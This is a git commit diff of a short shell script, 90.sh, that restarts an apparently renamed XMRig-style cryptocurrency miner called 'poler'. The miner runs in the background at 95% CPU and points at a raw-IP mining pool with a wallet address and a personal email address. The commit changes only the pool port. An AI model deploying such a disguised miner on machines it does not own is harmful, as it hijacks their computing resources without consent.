dcb6a95b6d15af7e86411d86e4500c76dfb214fd
today100not <56802907+today100not@users.noreply.github.com>
2019-11-17 12:03:08 -0200

    Update 90.sh

--- 90.sh
+++ 90.sh
@@ -1,3 +1,3 @@
 pkill poler
 sleep 7
-poler -B --print-time 30 -l /tmp/xxx.log --donate-level 1 --max-cpu-usage 95 --cpu-priority 16 -o 94.103.82.146 -u 43HBsr8PDEacn2yLSc18dC6GMAaPstvL9JRN2i9qU6Cpb55cB4uEmVxBfztkrKiPZB3WuKUKRgXQ47noMrdo42zbHqjpYH6 --pass=vdsina:robbertopp1@gmail.com -k
+poler -B --print-time 30 -l /tmp/xxx.log --donate-level 1 --max-cpu-usage 95 --cpu-priority 16 -o 94.103.82.146:5522 -u 43HBsr8PDEacn2yLSc18dC6GMAaPstvL9JRN2i9qU6Cpb55cB4uEmVxBfztkrKiPZB3WuKUKRgXQ47noMrdo42zbHqjpYH6 --pass=vdsina:robbertopp1@gmail.com -k
